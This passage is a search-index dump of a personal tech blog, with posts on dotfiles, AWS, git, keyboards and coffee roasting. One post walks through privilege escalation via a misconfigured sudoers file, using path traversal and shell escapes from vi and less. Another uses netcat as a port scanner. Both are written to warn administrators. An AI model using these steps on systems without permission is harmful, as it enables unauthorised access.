statusline+=%#warningmsg# set statusline+=%{SyntasticStatuslineFlag()} set statusline+=%* \u0026#34; show line#:column# on the right hand side set statusline+=%=%l:%c set number \u0026#34; no swap files set noswapfile \u0026#34; don\u0026#39;t write to a backup file then delete the original and then rename the \u0026#34; backup to the name of the original file... it\u0026#39;s annoying set nowritebackup \u0026#34; persistent undo set undofile set undodir=~/.vim/undodir \u0026#34; easier switch to split nmap \u0026lt;C-h\u0026gt; \u0026lt;C-w\u0026gt;h nmap \u0026lt;C-l\u0026gt; \u0026lt;C-w\u0026gt;l nmap \u0026lt;C-k\u0026gt; \u0026lt;C-w\u0026gt;k nmap \u0026lt;C-j\u0026gt; \u0026lt;C-w\u0026gt;j \u0026#34; changing tabs to spaces set expandtab ts=4 sts=4 sw=4 \u0026#34;setting autoindent set ai \u0026#34; Ignore case when searching set ignorecase \u0026#34; copy paste from system clipboard set clipboard=unnamed vmap ç \u0026#34;*y vmap ≈ \u0026#34;*d nmap √ :set paste\u0026lt;CR\u0026gt;\u0026#34;*p:set nopaste\u0026lt;CR\u0026gt; imap √ \u0026lt;ESC\u0026gt;√ \u0026#34; toggle paste mode with \u0026lt;F1\u0026gt; ... this way you can leave autocommenting on \u0026#34; most of the time a quickly disable it for pasting in code set pastetoggle=\u0026lt;F1\u0026gt; set showmode ","permalink":"https://ridingintraffic.github.io/posts/2018-12-02-dot-file-automation/","summary":"dot file automation Sharpen and clean your tools to make them last longer. Hone your tools to make them more precise. The tools of a SRE start with the terminal. The terminal is honed sharp with dotfiles.\nLive your life long enough in a terminal and tweaks and customizations happen. Live longer and when those tweaks are lost from a catastrophe or when you switch machines, you will be hamstrung and saddened going back to nothing.","title":"dot file automation"},{"content":"We have an AWS ORG, we want to share some things between accounts in the ORG. Namely ecr and code artifact. In order to get an ECR repository to share, be shared across multiple AWS accounts, you have many, many, many different ways that you can do this. You can do it probably 12 different ways, and maybe even more than that. But I am going to do it with AWS orgs and with kind of a permissive structure in that anyone that is a part of the org will get access to the ECR. So I will accomplish this with a repository policy that is attached to every repository. And for us, that is going to be very easy. But subsequently, we have to do it in every single repository, and that is a lot of repositories. So what we are going to do is attach the policy that says if the request is coming from someone that is a part of our org, let the request through. And you do that with an AWS org ID called out in the IAM. The technical things can be looked at in detail. But that is how AWS orgs can share ECR policies across many accounts.\nAWS Code Artifact repositories shared across an AWS org. In order to share code artifact repositories among separate AWS accounts and an AWS org, one way to do it is to tell code artifact that any account inside of the org can access this. Now you need to do that in two places. You need to do that in the code artifact domain. You also need to apply the same policy to the repository itself. Each repository gets an STS and gets a caller identity and yada yada yada, some technical IAM thing that I need to paste here. At the domain level, it needs both of those permissions as well. Otherwise, it doesn\u0026rsquo;t work. It needs to be in both places. So in order to get everything rolling, both must be done at the same time. But that\u0026rsquo;s how that works. So just turn it on, right? Make it work.\n","permalink":"https://ridingintraffic.github.io/posts/2024-05-14-aws_orgs_ecr/","summary":"We have an AWS ORG, we want to share some things between accounts in the ORG. Namely ecr and code artifact. In order to get an ECR repository to share, be shared across multiple AWS accounts, you have many, many, many different ways that you can do this. You can do it probably 12 different ways, and maybe even more than that. But I am going to do it with AWS orgs and with kind of a permissive structure in that anyone that is a part of the org will get access to the ECR.","title":"ecr and aws orgs"},{"content":"git revert first checkout the master branch:\nGit checkout master\nthen run a git log and get the id of the merge commit.\ngit log\nthen revert to that commit:\ngit revert -m 1 \u0026lt;merge-commit\u0026gt;\nWith ‘-m 1’ we tell git to revert to the first parent of the mergecommit on the master branch. -m 2 would specify to revert to the first parent on the develop branch where the merge came from initially. Now commit the revert and push changes to the remote repo and you are done. Getting back the reverted changes This changes the data to look like before the merge, but not the history. So it’s not exactly like an undo. If we would merge develop into master again the changes we reverted in master wont be applied. So if we would like these changes back again we could revert our first revert(!).\ngit revert \u0026lt;commit-of-first-revert\u0026gt;\nview the log of a single file git log --follow -p \u0026lt;filename/path\u0026gt;\ngit rebase squash git rebase -i ; where the commit hash is the one before yours the reword all of hte commits except for your latest one, the latest one you pick then check the git log to make sure that you only have one commit finally on your feature branch to a git push --force which will force your local into the branch you are working on and hopefully everything will get squashed\n","permalink":"https://ridingintraffic.github.io/posts/2016-02-19-git/","summary":"git revert first checkout the master branch:\nGit checkout master\nthen run a git log and get the id of the merge commit.\ngit log\nthen revert to that commit:\ngit revert -m 1 \u0026lt;merge-commit\u0026gt;\nWith ‘-m 1’ we tell git to revert to the first parent of the mergecommit on the master branch. -m 2 would specify to revert to the first parent on the develop branch where the merge came from initially.","title":"Git"},{"content":"Github releases There is a nice way to get the latest release from a github repo. as long as it gets tagged as release. I like to be able to pull down the latest version of a release for specific code in automated builds. This helps that.\nUse curl to get the JSON response for the latest release Use grep to find the line containing file URL Use cut and tr to extract the URL Use wget to download it\ncurl -s https://api.github.com/repos/hashcat/hashcat/releases/latest | grep \u0026#34;browser_download_url\u0026#34; | cut -d : -f 2,3 | tr -d \\\u0026#34; | wget --no-check-certificate -qi - gist credit goes to https://gist.github.com/steinwaywhw/a4cd19cda655b8249d908261a62687f8#file-one-liner-to-download-the-latest-release-from-github-repo-md\npowershell curl powershell can call webpages directly and return it much like curl\n(Invoke-WebRequest -Uri \u0026#34;https://github.com/raw/something\u0026#34; -SkipCertificateCheck).content | Out-File -FilePath /tmp/something.txt ","permalink":"https://ridingintraffic.github.io/posts/2019-04-09-github-one-liner/","summary":"Github releases There is a nice way to get the latest release from a github repo. as long as it gets tagged as release. I like to be able to pull down the latest version of a release for specific code in automated builds. This helps that.\nUse curl to get the JSON response for the latest release Use grep to find the line containing file URL Use cut and tr to extract the URL Use wget to download it","title":"github one liner and powershell curl"},{"content":"Wiki |-+-+-| |git | chef| ansible| |qmk | tmux| cli |\n","permalink":"https://ridingintraffic.github.io/posts/2016-02-19-wiki-index/","summary":"Wiki |-+-+-| |git | chef| ansible| |qmk | tmux| cli |","title":"index"},{"content":"git-secrets I came across this handy piece of software today, called git-secrets. It is made by awslabs and it acts as a git-hook that will stop you form doing stupid things. https://github.com/awslabs/git-secrets\n","permalink":"https://ridingintraffic.github.io/posts/2019-01-02-git-secrets/","summary":"git-secrets I came across this handy piece of software today, called git-secrets. It is made by awslabs and it acts as a git-hook that will stop you form doing stupid things. https://github.com/awslabs/git-secrets","title":"keeping secrets out of git"},{"content":"finding an item in a list python can do a lot of smart things, lets use the python way of finding items in a list.\n#python 3 tags=[ { \u0026#34;Key\u0026#34;: \u0026#34;CreationDate\u0026#34;, \u0026#34;Value\u0026#34;: \u0026#34;201904011158\u0026#34; }, { \u0026#34;Key\u0026#34;: \u0026#34;Name\u0026#34;, \u0026#34;Value\u0026#34;: \u0026#34;mymagicserver\u0026#34; }, { \u0026#34;Key\u0026#34;: \u0026#34;aws:autoscaling:groupName\u0026#34;, \u0026#34;Value\u0026#34;: \u0026#34;my-rad-asg\u0026#34; }, { \u0026#34;Key\u0026#34;: \u0026#34;Environment\u0026#34;, \u0026#34;Value\u0026#34;: \u0026#34;cloudy\u0026#34; }, { \u0026#34;Key\u0026#34;: \u0026#34;name\u0026#34;, \u0026#34;Value\u0026#34;: \u0026#34;john\u0026#34; }, { \u0026#34;Key\u0026#34;: \u0026#34;Department\u0026#34;, \u0026#34;Value\u0026#34;: \u0026#34;sporting goods\u0026#34; }, { \u0026#34;Key\u0026#34;: \u0026#34;Auto-Off\u0026#34;, \u0026#34;Value\u0026#34;: \u0026#34;no\u0026#34; } ] data = list(filter(lambda x: x[\u0026#34;Key\u0026#34;] == \u0026#34;aws:autoscaling:groupName\u0026#34; , tags)) print(data[0][\u0026#34;Value\u0026#34;]) ##brute force way: def bruteforce(mylist) for item in mylist: if item[\u0026#34;Key\u0026#34;] == \u0026#34;aws:autoscaling:groupName\u0026#34;: return item[\u0026#34;Value\u0026#34;] print(bruteforce(tags)) ","permalink":"https://ridingintraffic.github.io/posts/2019-06-06-pythonic-list-find/","summary":"finding an item in a list python can do a lot of smart things, lets use the python way of finding items in a list.\n#python 3 tags=[ { \u0026#34;Key\u0026#34;: \u0026#34;CreationDate\u0026#34;, \u0026#34;Value\u0026#34;: \u0026#34;201904011158\u0026#34; }, { \u0026#34;Key\u0026#34;: \u0026#34;Name\u0026#34;, \u0026#34;Value\u0026#34;: \u0026#34;mymagicserver\u0026#34; }, { \u0026#34;Key\u0026#34;: \u0026#34;aws:autoscaling:groupName\u0026#34;, \u0026#34;Value\u0026#34;: \u0026#34;my-rad-asg\u0026#34; }, { \u0026#34;Key\u0026#34;: \u0026#34;Environment\u0026#34;, \u0026#34;Value\u0026#34;: \u0026#34;cloudy\u0026#34; }, { \u0026#34;Key\u0026#34;: \u0026#34;name\u0026#34;, \u0026#34;Value\u0026#34;: \u0026#34;john\u0026#34; }, { \u0026#34;Key\u0026#34;: \u0026#34;Department\u0026#34;, \u0026#34;Value\u0026#34;: \u0026#34;sporting goods\u0026#34; }, { \u0026#34;Key\u0026#34;: \u0026#34;Auto-Off\u0026#34;, \u0026#34;Value\u0026#34;: \u0026#34;no\u0026#34; } ] data = list(filter(lambda x: x[\u0026#34;Key\u0026#34;] == \u0026#34;aws:autoscaling:groupName\u0026#34; , tags)) print(data[0][\u0026#34;Value\u0026#34;]) ##brute force way: def bruteforce(mylist) for item in mylist: if item[\u0026#34;Key\u0026#34;] == \u0026#34;aws:autoscaling:groupName\u0026#34;: return item[\u0026#34;Value\u0026#34;] print(bruteforce(tags)) ","title":"pythonic list find"},{"content":"qmk notes there is a bunch of qmk stuff out there this is what you need for qmk and the ergodox ez keyboard…\nhttps://docs.qmk.fm/ - qmk documentation\nhttps://www.pjrc.com/teensy/loader_linux.html ***if you are programming it with the qmk toolbox make sure that your have karabiner elements turned off\ndocker images qmk builder can be done via docker. This means that it is way easier to build than dealing with all the dependencies for building, just use docker.\ndocker run -e keymap=default_modded -e keyboard=ergodox_ez --rm -v $(\u0026#39;pwd\u0026#39;):/qmk:rw edasque/qmk_firmware docker run -e keymap=ridingintraffic -e keyboard=ergodox_ez --rm -v $(\u0026#39;pwd\u0026#39;):/qmk:rw edasque/qmk_firmware docker run -e keymap=ridingintraffic -e keyboard=planck/rev4 --rm -v $(\u0026#39;pwd\u0026#39;):/qmk:rw edasque/qmk_firmware location for qmk build and install https://github.com/qmk/qmk_toolbox/releases\n","permalink":"https://ridingintraffic.github.io/posts/2016-02-20-qmk/","summary":"qmk notes there is a bunch of qmk stuff out there this is what you need for qmk and the ergodox ez keyboard…\nhttps://docs.qmk.fm/ - qmk documentation\nhttps://www.pjrc.com/teensy/loader_linux.html ***if you are programming it with the qmk toolbox make sure that your have karabiner elements turned off\ndocker images qmk builder can be done via docker. This means that it is way easier to build than dealing with all the dependencies for building, just use docker.","title":"qmk"},{"content":"#QMK animation Having a keyboard with an oled screen means that you can add things to it. This cute little bongo cat animations or other things.\nThis lets you create all sorts of animations https://githubmemory.com/repo/AskMeAboutBirds/qmk-oled-animation-compressor\n","permalink":"https://ridingintraffic.github.io/posts/2021-07-12/","summary":"#QMK animation Having a keyboard with an oled screen means that you can add things to it. This cute little bongo cat animations or other things.\nThis lets you create all sorts of animations https://githubmemory.com/repo/AskMeAboutBirds/qmk-oled-animation-compressor","title":"qmk-animations"},{"content":"Roasting log |-+-+-|\n3/16 inside costa rican sonora temp:68 start weight: 4.0 oz end weight: 3.45 oz watt/time temp - time preheat: 275 325 - 7:15 650 4min 200 - 0:30 350 - 8:50 800 4min 225 - 1:15 375 - 9:50 250 - 1:45 400 - 11:10 drop 11:10 275 - 3:30 300 - 5:00 |-+-+-|\n3/2 inside ethopia ugaro temp:68 start weight: 4.0 oz end weight: 3.4 oz watt/time temp - time preheat: 275 175 - :30 325 - 8:20 650 4min 200 - 1:00 350 - 9:00 800 4min 225 - 1:20 375 - 10:00 250 - 2:00 400 - 11:40 drop 13:00 275 - 4:00 300 - 5:30 |-+-+-|\n3/2 inside ethopia ugaro temp:68 start weight: 4.0 oz end weight: 3.4 oz watt/time temp - time preheat: 275 200 - :30 325 - 7:15 650 4min 225 - 1:00 350 - 8:50 800 4min 250 - 1:45 375 - 9:50 275 - 3:30 400 - 11:00 drop 12:30 300 - 5:00 310 - 6:00 |-+-+-|\n2/24 garage ethopia yukiro temp:55 start weight: 4.4 oz end weight: 3.8 oz watt/time temp - time preheat: none 650 4min 800 4min 960 drop 17:30 |-+-+-|\n2/17 garage ethopia yukiro temp:55 start weight: 4.0 oz end weight: 3.5 oz watt/time temp - time preheat: none 650 4min 800 4min 950 drop:22:00 |-+-+-|\n2/10 garage ethopia yukiro temp:65 start weight: 4.0 oz end weight: 3.4 oz watt/time temp - time preheat: none 500 4min 750 4min 950 drop 20:00 |-+-+-|\n2/7 garage ethopia yukiro temp:55 start weight: 4.0 oz end weight: 3.3 oz watt/time temp - time preheat: none drop 11:30 |-+-+-|\n2/1 garage peaberry temp:50 start weight: 2.9 oz end weight: 2.4 oz watt/time temp - time preheat: none drop 13:45 |-+-+-|\n1/19 garage peaberry temp:50 start weight: 2.9 oz end weight: 2.4 oz watt/time temp - time preheat: none drop 11:15 |-+-+-|\n1/18 garage peaberry temp:45 start weight: 3.9 oz end weight: 3.3 oz watt/time temp - time preheat: 60 sec drop 9:45 ","permalink":"https://ridingintraffic.github.io/posts/2017-03-08-roasting-log/","summary":"Roasting log |-+-+-|\n3/16 inside costa rican sonora temp:68 start weight: 4.0 oz end weight: 3.45 oz watt/time temp - time preheat: 275 325 - 7:15 650 4min 200 - 0:30 350 - 8:50 800 4min 225 - 1:15 375 - 9:50 250 - 1:45 400 - 11:10 drop 11:10 275 - 3:30 300 - 5:00 |-+-+-|\n3/2 inside ethopia ugaro temp:68 start weight: 4.0 oz end weight: 3.4 oz watt/time temp - time preheat: 275 175 - :30 325 - 8:20 650 4min 200 - 1:00 350 - 9:00 800 4min 225 - 1:20 375 - 10:00 250 - 2:00 400 - 11:40 drop 13:00 275 - 4:00 300 - 5:30 |-+-+-|","title":"roasting log"},{"content":"sql server I needed to connect to a sql db this morning and I didn\u0026rsquo;t have a client. Docker to the rescue! docker run -it mysql /bin/bash mysql -u \u0026lt;myuser\u0026gt; -p -h \u0026lt;myhost\u0026gt; \u0026lt;mydatabase\u0026gt; and done. when using the -p flag it will prompt you for the password instead of having it in the terminal. Simple easy and connected.\n","permalink":"https://ridingintraffic.github.io/posts/2019-04-22-sql-server-terminal/","summary":"sql server I needed to connect to a sql db this morning and I didn\u0026rsquo;t have a client. Docker to the rescue! docker run -it mysql /bin/bash mysql -u \u0026lt;myuser\u0026gt; -p -h \u0026lt;myhost\u0026gt; \u0026lt;mydatabase\u0026gt; and done. when using the -p flag it will prompt you for the password instead of having it in the terminal. Simple easy and connected.","title":"sql server terminal"},{"content":"sudo make me a sandwich, then I\u0026rsquo;ll pwn your fridge Sudo is a program for Unix-like computer operating systems that allows users to run programs with the security privileges of another user. wikipedia-sudo\nLet’s say that we have a folder named /luggage/. The luggage is carrying some incredibly valuable things. Rincewind and twoflower are two users who have been traveling with this luggage for sometime. Because, rincewind doesn\u0026rsquo;t want twoflower to read the octavo, but is fine if he looks at the camera, both which are located in the in the luggage. /luggage/camera/ /luggage/octavo/ We have allowed twoflower to run only the cat command as rincewind, and only in the location /luggage/camera/ folder. Because, we don’t know what the photos will be named we will wildcard all the filenames in /luggage/camera/*\nRincewind feels pretty good that twoflower will never be able to read anything in the octavo and certainly never be able to read the spell located in the folder and file permissions are both set with 0700. Below is the output of /etc/sudoers.d/012-twoflower file and a command output.\n#/etc/sudoers.d/012-twoflower twoflower discworld=(rincewind) /bin/cat /luggage/camera/* root@discworld:/ $ ls -lA /luggage total 8 drwxr-xr-x 2 twoflower twoflower 4096 Dec 5 02:37 camera drwx------ 2 rincewind rincewind 4096 Dec 5 02:40 octavo root@discworld:/luggage $ ls -la /luggage/octavo/ total 12 drwx------ 2 rincewind rincewind 4096 Dec 5 02:40 . drwxrwxrwx 4 root root 4096 Dec 5 02:37 .. -rwx------ 1 rincewind rincewind 67 Dec 5 02:40 spell We feel pretty good about this setup, it has only allowed twoflower a single command in a single path. Next we let twoflower have at it. And then something terrible happens.\n$ twoflower@discworld:/luggage$ sudo -l Matching Defaults entries for twoflower on discworld: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User twoflower may run the following commands on discworld: (rincewind) /bin/cat /luggage/camera/* $ twoflower@discworld:/luggage$ sudo -u rincewind cat /luggage/octavo/spell Sorry, user twoflower is not allowed to execute \u0026#39;/bin/cat /luggage/octavo/spell\u0026#39; as rincewind on discworld. $ twoflower@discworld:/luggage$ sudo -u rincewind cat /luggage/camera/../octavo/spell Ashonai. Ebiris. Urshoring. Kvanti. Pythan. N\u0026#39;gurad. Feringomalee. twoflower@discworld:/luggage$ Twoflower has read the spell inside of the octavo and everything has ended. How? what? This is simply the way that the wildcard works with sudo. It’s just turtles, all the way down. We should never use wildcards like this in sudo, ever.\nNext, lock it down, we will take away the cat command and replace it with just VI and then no arguments can be passed to VI, because if a wildcarded path is included then VI will fall to the same directory traversal issue.\nroot@discworld:~# cat /etc/sudoers.d/012_twoflower-nopasswd twoflower discworld=(rincewind) /usr/bin/vi \u0026#34;\u0026#34; twoflower@discworld:/luggage/camera$ sudo -u rincewind vi /luggage/camera/../octavo/spell Sorry, user twoflower is not allowed to execute \u0026#39;/usr/bin/vi /luggage/camera/../octavo/spell\u0026#39; as rincewind on discworld. ## you shall not pass(arguments)! twoflower@discworld:/luggage/camera$ sudo -u rincewind vi \u0026lt;vim session opens\u0026gt; ~ :e ../octavo/spell\u0026lt;enter\u0026gt; ... Ashonai. Ebiris. Urshoring. Kvanti. Pythan. N\u0026#39;gurad. Feringomalee. ## awe nuts you can open the file if you traverse directories after VI is open ## ...it gets worse ~\u0026lt;\u0026lt;still in vim\u0026gt;\u0026gt; :!/bin/bash\u0026lt;enter\u0026gt; \u0026lt;new shell session opens from vim\u0026gt; rincewind@discworld:/luggage/camera$ rincewind@discworld:/luggage/camera$ cd ../octavo/ rincewind@discworld:/luggage/octavo$ cat spell Ashonai. Ebiris. Urshoring. Kvanti. Pythan. N\u0026#39;gurad. Feringomalee. rincewind@discworld:/luggage/octavo$ ## world sets on fire :( This is even worse because now, not only can twoflower still open read and edit the spell in the octavo, VIM has enabled a shell escape as the sudoer. This is because VIM is invoking the shell after the session is launched as the sudoer. Honey badger (VIM) don’t care what the sudoers.d/file said. Alright next step, take away VIM, give twoflower less and ONLY a single file in a single folder, because less has to be better.\nroot@discworld:~# cat /etc/sudoers.d/012_twoflower-nopasswd twoflower discworld=(rincewind) /usr/bin/less /luggage/camera/picture twoflower@discworld:/luggage/camera$ sudo -u rincewind less picture Sorry, user twoflower is not allowed to execute \u0026#39;/usr/bin/less picture\u0026#39; as rincewind on discworld. ## got it i need the whole path twoflower@discworld:/luggage/camera$ sudo -u rincewind less /luggage/camera/picture \u0026lt;less session begins\u0026gt; i see things /luggage/camera/picture (END) \u0026lt;type\u0026gt;:q\u0026lt;enter\u0026gt; \u0026lt;quit less session\u0026gt; ## start the sudo less command and pass the picture file ## can i traverse? twoflower@discworld:/luggage/camera$ sudo -u rincewind less /luggage/camera/../octavo/spell Sorry, user twoflower is not allowed to execute \u0026#39;/usr/bin/less /luggage/camera/../octavo/spell\u0026#39; as rincewind on discworld. ## traverse failed ## but wait... twoflower@discworld:/luggage/camera$ sudo -u rincewind less /luggage/camera/picture \u0026lt;less session begins\u0026gt; i see things /luggage/camera/picture (END) \u0026lt;type\u0026gt;!bash\u0026lt;enter\u0026gt; \u0026lt;new bash session starts\u0026gt; rincewind@discworld:/luggage/camera$ cat ../octavo/spell Ashonai. Ebiris. Urshoring. Kvanti. Pythan. N\u0026#39;gurad. Feringomalee. ## gdi ## less has launched an escaped shell as rincewind and now we can read the spell (facepalm) Sudo is a super powerful and incredibly dangerous tool. The commands that are allowed sudo access need to be thought out and the functionality needs to be understood. None of these examples are exploits, or overflows. They are all working exactly as designed. Understand the privileges that you are granting with sudo, otherwise someone will get into your fridge, eat all your food and then burn down your house.\nGreat source for deeper explanation of restricted shells and commands. escaping-restricted-linux-shells\n","permalink":"https://ridingintraffic.github.io/posts/2018-12-05-sudo-make-me-a-sandwich/","summary":"sudo make me a sandwich, then I\u0026rsquo;ll pwn your fridge Sudo is a program for Unix-like computer operating systems that allows users to run programs with the security privileges of another user. wikipedia-sudo\nLet’s say that we have a folder named /luggage/. The luggage is carrying some incredibly valuable things. Rincewind and twoflower are two users who have been traveling with this luggage for sometime. Because, rincewind doesn\u0026rsquo;t want twoflower to read the octavo, but is fine if he looks at the camera, both which are located in the in the luggage.","title":"sudo make me a sandwich"},{"content":"vim scrolling Ctrl-b then [ then you can use your normal navigation keys to scroll around (eg. Up Arrow or PgDn). Press q to quit scroll mode.\nSelection and copying once in acroll mode spacebar character slect mode\nonce in scroll mode shift+V line select mode\nonce selected y copies to clipboard\npaste like normal\n","permalink":"https://ridingintraffic.github.io/posts/2016-02-21-tmux/","summary":"vim scrolling Ctrl-b then [ then you can use your normal navigation keys to scroll around (eg. Up Arrow or PgDn). Press q to quit scroll mode.\nSelection and copying once in acroll mode spacebar character slect mode\nonce in scroll mode shift+V line select mode\nonce selected y copies to clipboard\npaste like normal","title":"tmux"},{"content":"netcat netcat can work like a portscanner. If it is the only tool that you have you make do. this is going to scan localhost across all of the ports\nnc -zv 127.0.0.1 1-65535 ","permalink":"https://ridingintraffic.github.io/posts/2018-12-11-netcat-portscanner/","summary":"netcat netcat can work like a portscanner. If it is the only tool that you have you make do. this is going to scan localhost across all of the ports\nnc -zv 127.0.0.1 1-65535 ","title":"using netcat as a portscanner"},{"content":"I have been thinking that I should start writing again. Over the past few years I have gone back and forth on the writing and finding both the time and the inspiration to begin writing again. Why have I not been writing enough? Part of it is I have not had the creative energy, and I have not had the inspiration, or I have not been remembering to do it. Also, I\u0026rsquo;ve not been writing down things I\u0026rsquo;m learning, and it\u0026rsquo;s frustrating because I cannot remember what things are, and in order to solve that, I simply need to write things down and start writing again. So, I am going to try to do some transcription to blog entries, and it will be a bit rambling because I am speaking rather than typing, but I think I can save some time, and maybe get the things out of my head when I have that creative energy. Then just do some editing afterwards. From there I hopefully will start to create more written content for people to read and digest. Possibly I can then bolt on the recordings of my train of thought as well. I don\u0026rsquo;t know, maybe that can be useful. I can also do a voiceover reading of the article that I write, because I guess I have a pretty decent reading voice. This is just something that I have been thinking about, and I think it might work, because I have spent a couple months now doing audio journaling. This audio journaling lets me gather my thoughts and get things out of my head verbally. Which has allowed me to become more fluent in getting those thoughts out, clearly. So we\u0026rsquo;re gonna give it a try.\n\u0026hellip; update its been a month and i havent gotten any better about writing again. It would seem that life is really difficult some/most days.\n","permalink":"https://ridingintraffic.github.io/posts/2024-05-14-writing_again-copy/","summary":"I have been thinking that I should start writing again. Over the past few years I have gone back and forth on the writing and finding both the time and the inspiration to begin writing again. Why have I not been writing enough? Part of it is I have not had the creative energy, and I have not had the inspiration, or I have not been remembering to do it. Also, I\u0026rsquo;ve not been writing down things I\u0026rsquo;m learning, and it\u0026rsquo;s frustrating because I cannot remember what things are, and in order to solve that, I simply need to write things down and start writing again.","title":"writing again?"},{"content":"I am trying to create a dongle setup to use with my wireless skeltyls. I have not been using them as much as i would like because they are a giant pita to deal with when they come out of sleep, and when they are reconnecting. so i thought that i would like to try and do a dongle mode with them and see how it goes.\nWorking with ZMK dongles mode in ZMK I have a ZMK keyboard. I have many ZMK keyboards. Right now I have two different skeletal keyboards and they are all using nice nano BLE boards on them and the Bluetooth connectivity, once it gets connected, it is fine. However, when the Mac goes to sleep or when the keyboard goes to sleep, getting both halves reconnected to the Mac is difficult and annoying and then hopping between computers is doubly difficult because I forget which computer is under which BLE profile and then reconnecting, disconnecting, forgetting, clearing the bonding, etc. It\u0026rsquo;s super, super annoying. So the way around that is to use a separate BLE board as a BLE dongle and that BLE dongle then needs its own firmware and its own connection information. So I had a number of seed do we know BLE boards and I found out that we could use dongles for that or use that in a dongle mode. So I took the firmware and using these configuration pinouts and configuration settings for the keyboard we can then create a BLE dongle with the seed do we know board and use that to connect to the nice nano boards. Simple and relatively painless and that is that.\n","permalink":"https://ridingintraffic.github.io/posts/2024-05-14-zmk_dongles/","summary":"I am trying to create a dongle setup to use with my wireless skeltyls. I have not been using them as much as i would like because they are a giant pita to deal with when they come out of sleep, and when they are reconnecting. so i thought that i would like to try and do a dongle mode with them and see how it goes.\nWorking with ZMK dongles mode in ZMK I have a ZMK keyboard.","title":"zmk dongles"}]